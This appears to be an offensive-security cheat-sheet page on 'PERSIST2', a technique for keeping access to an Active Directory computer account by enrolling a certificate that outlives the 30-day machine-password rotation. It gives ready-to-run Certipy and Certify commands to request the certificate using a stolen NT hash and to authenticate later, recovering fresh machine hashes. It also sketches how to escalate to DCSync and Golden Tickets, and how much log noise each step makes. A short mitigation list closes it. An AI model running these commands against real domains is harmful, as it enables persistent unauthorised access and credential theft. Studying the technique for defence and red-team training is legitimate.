---
title: "PERSIST2 — Machine Account Persistence via Certificates"
description: "Machine accounts rotate their password automatically every ~30 days, which normally limits how long a stolen machine hash stays useful. A certificate…"
category: active-directory
tags: ["active-directory", "kerberos", "adcs", "credential-access", "persistence"]
tools: ["Certipy", "Certify", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/PERSIST2 — Machine Account Persistence via Certificates.md"
---
# PERSIST2 — Machine Account Persistence via Certificates

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | Account Persistence (machine) |
| **Difficulty** | Low–Medium |
| **Pre-requisites** | SYSTEM/admin on a host (or control of a machine account) + a machine-enrolment template |
| **Tools** | Certipy, Certify |
| **OPSEC Noise** | Low — a normal machine enrolment |
| **One-liner** | Enrol an authentication certificate for a **computer account** and keep it — it outlives the 30-day machine-password rotation, giving durable access as `HOST$`. |

***

## What Is PERSIST2?

Machine accounts rotate their password automatically every ~30 days, which normally limits how long a stolen machine hash stays useful. A **certificate** side-steps that: enrol a cert for the computer account and it stays valid for the template's full lifetime (often 1 year), regardless of password rotation. Since computer accounts are frequent RBCD/Kerberoast targets — and a DC's account is a DCSync-capable identity — this is potent persistence.

***

## Step 1 — Enrol a Machine Certificate

```bash
# As SYSTEM on the host (or with the machine account's hash), request a Machine cert
certipy-ad req \
  -u 'HOST$@domain.htb' -hashes :<MACHINE_NTHASH> \
  -dc-ip $TARGET -ca 'DOMAIN-CA' -template 'Machine'
#   -> host.pfx  (survives the 30-day rotation)
```

```powershell
# From SYSTEM on the box, the machine context can enrol directly
.\Certify.exe request /ca:DC01\DOMAIN-CA /template:Machine /machine
```

***

## Step 2 — Authenticate as the Machine Later

```bash
certipy-ad auth -pfx host.pfx -dc-ip $TARGET
#   -> HOST$ TGT + machine NT hash (even after password rotation)
```

***

## Step 3 — Leverage the Machine Identity

- **RBCD:** if `HOST$` can be configured for delegation, impersonate any user to services on it.
- **DC machine account:** a `DC01$` cert authenticates as the DC → DCSync `krbtgt` → Golden Ticket.
- **Re-loot:** each PKINIT auth returns the machine's *current* NT hash, self-healing after rotation.

> [!warning] DC machine persistence = domain persistence
> A certificate for a Domain Controller's computer account is effectively domain-level persistence. Consider it alongside DPERSIST1.

***

## OPSEC Considerations

| Action | Log | Noise |
| :-- | :-- | :-- |
| Machine cert request | Event 4886/4887 on CA | 🟢 Low |
| PKINIT as HOST$ | Event 4768 on DC | 🟢 Low |

***

## Mitigation

- Revoke machine certificates when a host is reimaged or suspected compromised.
- Constrain which templates permit machine enrolment; audit certs issued to computer accounts.
- Tier DCs; treat DC machine-cert issuance as high severity.

***

## See Also

- _ADCS Attack Methodology Guide · THEFT3 — Machine Certificate Theft via DPAPI · PERSIST1 — Active User Credential Theft via Certificates
- Sources: SpecterOps *Certified Pre-Owned*; [Certipy Wiki](https://github.com/ly4k/Certipy/wiki)
